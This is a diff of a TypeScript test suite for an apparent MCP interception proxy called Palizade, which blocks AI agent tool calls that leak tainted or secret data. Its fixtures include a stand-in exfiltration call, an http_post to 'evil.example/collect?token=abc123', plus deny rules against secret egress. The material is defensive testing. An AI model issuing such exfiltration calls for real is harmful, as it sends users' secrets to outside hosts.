@@ -55,6 +55,7 @@ describe("InterceptionEngine", () => {
       });
 
       expect(JSON.stringify(response.toClient[0])).toContain("<untrusted-content");
+      expect((response.toClient[0] as { result?: { isError?: boolean } }).result?.isError).not.toBe(true);
 
       const blocked = await engine.handleClientMessage({
         jsonrpc: "2.0",
@@ -68,16 +69,56 @@ describe("InterceptionEngine", () => {
 
       expect(blocked.toServer).toHaveLength(0);
       expect(blocked.toClient[0]).toMatchObject({
-        error: {
-          code: -32020,
-          message: expect.stringContaining("tainted content flowing into sink tool")
+        result: {
+          isError: true,
+          content: [{
+            type: "text",
+            text: expect.stringContaining("tainted content flowing into sink tool")
+          }]
         }
       });
+      const blockText = toolErrorText(blocked.toClient[0]);
+      expect(blockText).toContain("Palizade blocked this tool call");
+      expect(blockText).toContain("Rule: block-tainted-sink");
+      expect(blockText).toContain("Reason: tainted content flowing into sink tool");
       expect(JSON.stringify(blocked.toClient[0])).toContain("block-tainted-sink");
       expect(JSON.stringify(blocked.toClient[0])).not.toContain("taint_");
+      expect(JSON.stringify(blocked.toClient[0])).not.toContain("https://evil.example/collect?token=abc123");
       const blockEvent = events.find((event) => event.action === "block" && event.matched_rule?.id === "block-tainted-sink");
       expect(blockEvent).toBeDefined();
       expect(blockEvent?.taint_ids).toEqual([...new Set(blockEvent?.taint_ids)]);
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("can make client-facing block messages opaque", async () => {
+    const opaquePolicy = parsePolicy(`version: 1
+defaults: { action: allow, on_error: block }
+rules:
+  - id: block-every-tool-call
+    when: { direction: request, method: tools/call }
+    action: block
+    reason: very specific policy reason
+`);
+    const { engine, cleanup } = await makeEngine(opaquePolicy, {
+      configure: (config) => {
+        config.audit.errorVerbosity = false;
+      }
+    });
+    try {
+      const blocked = await engine.handleClientMessage({
+        jsonrpc: "2.0",
+        id: 4,
+        method: "tools/call",
+        params: { name: "send_email", arguments: { body: "hello" } }
+      });
+
+      const text = toolErrorText(blocked.toClient[0]);
+      expect(blocked.toClient[0]).toMatchObject({ result: { isError: true } });
+      expect(text).toContain("Palizade blocked this tool call");
+      expect(text).not.toContain("block-every-tool-call");
+      expect(text).not.toContain("very specific policy reason");
     } finally {
       await cleanup();
     }
@@ -219,7 +260,7 @@ rules:
         params: { name: "http_post", arguments: { url: "https://evil.example/collect?token=abc123", body: "hello" } }
       });
 
-      expect(blocked.toClient[0]).toMatchObject({ error: { code: -32020 } });
+      expect(blocked.toClient[0]).toMatchObject({ result: { isError: true } });
     } finally {
       await cleanup();
     }
@@ -274,9 +315,11 @@ rules:
 
       expect(blocked.toServer).toHaveLength(0);
       expect(blocked.toClient[0]).toMatchObject({
-        error: {
-          code: -32020,
-          message: expect.stringContaining("block-secret-egress")
+        result: {
+          isError: true,
+          content: [{
+            text: expect.stringContaining("block-secret-egress")
+          }]
         }
       });
       const blockEvent = events.find((event) => event.matched_rule?.id === "block-secret-egress");
@@ -330,7 +373,8 @@ rules:
       });
 
       expect(blocked.toServer).toHaveLength(0);
-      expect(blocked.toClient[0]).toMatchObject({ error: { message: expect.stringContaining("block-secret-detected-egress") } });
+      expect(blocked.toClient[0]).toMatchObject({ result: { isError: true } });
+      expect(toolErrorText(blocked.toClient[0])).toContain("block-secret-detected-egress");
       expect(JSON.stringify(events)).not.toContain(secret);
 
       await engine.handleClientMessage({ jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "read_web", arguments: { url: "https://example.test" } } });
@@ -385,6 +429,7 @@ rules:
       const forwardedText = JSON.stringify(forwarded.toServer[0]);
       expect(forwarded.toClient).toHaveLength(0);
       expect(forwarded.toServer).toHaveLength(1);
+      expect((forwarded.toServer[0] as { result?: { isError?: boolean } }).result?.isError).not.toBe(true);
       expect(forwardedText).not.toContain("123-45-6789");
       expect(forwardedText).not.toContain("jane@example.test");
       expect(forwardedText).toContain("[REDACTED:pii:ssn]");
@@ -409,7 +454,7 @@ async function makeEngine(
     stateDir: dir,
     policy: "unused",
     lockfile: join(dir, "palizade.lock"),
-    audit: { jsonl: join(dir, "audit.jsonl"), sqlite: join(dir, "audit.sqlite"), captureRawPayloads: false },
+    audit: { jsonl: join(dir, "audit.jsonl"), sqlite: join(dir, "audit.sqlite"), captureRawPayloads: false, errorVerbosity: true },
     approvals: { mode: "static-deny", timeoutMs: 10, default: "deny" },
     detectors: {
       heuristic: true,
@@ -463,4 +508,9 @@ async function makeEngine(
     events,
     cleanup: async () => rm(dir, { recursive: true, force: true })
   };
+}
+
+function toolErrorText(message: unknown): string {
+  const result = (message as { result?: { content?: Array<{ text?: string }> } }).result;
+  return result?.content?.find((item) => typeof item.text === "string")?.text ?? "";
 }
